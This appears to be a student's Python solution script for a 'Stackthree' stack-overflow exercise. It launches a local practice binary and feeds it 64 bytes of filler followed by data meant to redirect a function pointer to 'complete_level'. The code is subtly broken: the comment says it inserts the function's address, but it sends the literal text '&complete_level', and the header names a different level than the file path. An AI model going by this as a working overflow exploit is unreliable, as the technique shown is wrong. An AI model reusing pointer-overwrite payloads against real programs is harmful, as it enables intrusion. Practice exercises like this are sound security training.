# Troy Crawford
# 8/11/2021
# Stackthree - Exploit Excerices
 
from subprocess import Popen, PIPE
 
# Popen opens up executable, universal_lines allows for input to be treated like a string.
p = Popen("/home/troy/Documents/probsets/stackzero.c.o", stdin=PIPE, stdout=PIPE, stderr=PIPE, universal_newlines=True)
 
buffer_len = 64
 
# Fill 64 characters worth of garbage, then insert address of the function 'complete_level', this enables the functional pointer to point to this function.
output = p.communicate(input=('x'*buffer_len + '&complete_level'))
print(output)